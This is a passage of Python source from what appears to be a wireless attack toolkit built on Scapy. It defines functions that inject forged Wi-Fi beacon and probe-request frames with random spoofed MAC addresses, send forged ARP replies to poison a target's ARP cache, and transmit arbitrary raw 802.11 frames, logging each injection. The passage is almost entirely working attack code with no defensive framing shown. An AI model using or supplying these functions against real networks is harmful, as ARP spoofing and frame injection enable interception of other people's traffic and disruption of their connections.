              count=count, inter=0.1, verbose=False)
        forensic_event("inject_beacon",{"ssid":ssid,"bssid":bssid,"count":count})
        INJECT_LOG.append({"type":"beacon","target":ssid,"count":count,
                           "time":datetime.now().strftime("%H:%M:%S"),"iface":mon_iface})
        return True
    except Exception: return False

def inject_probe(ssid, mon_iface, count=50):
    if not SCAPY_OK: return False
    try:
        import random
        src = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        pkt = (RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff",
               addr2=src,addr3="ff:ff:ff:ff:ff:ff")/
               Dot11ProbeReq()/Dot11Elt(ID="SSID",info=ssid.encode(),len=len(ssid)))
        sendp(pkt, iface=mon_iface, count=count, inter=0.1, verbose=False)
        forensic_event("inject_probe",{"ssid":ssid,"count":count})
        INJECT_LOG.append({"type":"probe","target":ssid,"count":count,
                           "time":datetime.now().strftime("%H:%M:%S"),"iface":mon_iface})
        return True
    except Exception: return False

def inject_arp(target_ip, spoof_ip, count=50):
    if not SCAPY_OK: return False
    try:
        send(ARP(op=2,pdst=target_ip,psrc=spoof_ip), count=count,
             inter=0.1, verbose=False, iface=IFACE)
        forensic_event("inject_arp",{"target":target_ip,"spoof":spoof_ip,"count":count})
        INJECT_LOG.append({"type":"arp","target":target_ip,"count":count,
                           "time":datetime.now().strftime("%H:%M:%S"),"iface":IFACE})
        return True
    except Exception: return False

def inject_raw(mon_iface, hex_data, count=1):
    if not SCAPY_OK: return False
    try:
        raw_bytes = bytes.fromhex(hex_data.replace(" ","").replace("0x",""))
        sendp(RadioTap()/Raw(load=raw_bytes), iface=mon_iface, count=count, verbose=False)
        forensic_event("inject_raw",{"size":len(raw_bytes),"count":count})
        INJECT_LOG.append({"type":"raw","target":f"{len(raw_bytes)}B","count":count,
                           "time":datetime.now().strftime("%H:%M:%S"),"iface":mon_iface})
        return True
    except Exception: return False

